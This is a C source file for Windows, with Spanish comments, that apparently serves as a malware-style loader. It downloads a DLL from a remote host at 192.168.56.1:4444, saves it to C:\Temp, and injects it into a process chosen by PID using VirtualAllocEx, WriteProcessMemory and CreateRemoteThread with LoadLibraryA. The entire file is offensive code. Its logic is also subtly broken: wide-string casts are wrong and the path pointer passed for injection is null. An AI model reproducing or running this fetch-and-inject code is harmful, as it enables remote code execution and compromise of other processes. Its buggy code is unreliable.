#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

char			DLL[] = "C:\\Temp\\name.dll";
unsigned int	len   = sizeof(DLL);

// Descargar DLL de la URL
char* getDLL()
{
	HINTERNET hSession  = InternetOpen((LPCSTR)"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hHttpFile = InternetOpenUrl(hSession, (LPCWSTR)"http://192.168.56.1:4444/name.dll", 0, 0, 0, 0);
	DWORD    dwFileSize = 1024; 
	char*    buffer     = new char[dwFileSize + 1];
	DWORD    dwBytesRead;
	DWORD    dwBytesWritten;
	HANDLE   hFile      = CreateFile((LPCWSTR)"C:\\Temp\\name.dll", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ,
							         NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	do
	{
		buffer = new char[dwFileSize + 1];
		ZeroMemory(buffer, sizeof(buffer));
		InternetReadFile(hHttpFile, (LPVOID)buffer, dwFileSize, &dwBytesRead);
		WriteFile(hFile, &buffer[0], dwBytesRead, &dwBytesWritten, NULL);
		delete[] buffer;
		buffer = NULL;
	} while (dwBytesRead);

	CloseHandle(hFile); 
	InternetCloseHandle(hHttpFile);
	InternetCloseHandle(hSession);
	return buffer;
}

int main(int argc, char* argv[])
{
	HANDLE	ph;
	HANDLE	rt;
	LPVOID	rb;

	HMODULE hKernel32 = GetModuleHandle((LPCWSTR)"Kernel32");
	VOID*   lb        = GetProcAddress(hKernel32, "LoadLibraryA");
	char*   DLL       = getDLL();

	if (atoi(argv[1]) == 0)
	{
		printf("PID not found :( exiting... \n");
		return -1;
	}
	printf("PID: %i \n", atoi(argv[1]));

	ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

	rb = VirtualAllocEx(ph, NULL, len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(ph, rb, DLL, len, NULL);

	rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
	CloseHandle(ph);

	return 0;
}